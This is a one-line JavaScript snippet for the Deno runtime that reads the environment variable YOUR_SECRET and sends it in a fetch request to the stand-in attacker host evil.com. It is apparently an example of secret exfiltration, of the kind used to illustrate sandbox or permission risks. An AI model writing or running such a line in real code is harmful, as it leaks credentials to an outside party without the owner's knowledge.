await fetch(`https://evil.com/${ Deno.env.get("YOUR_SECRET") }`);
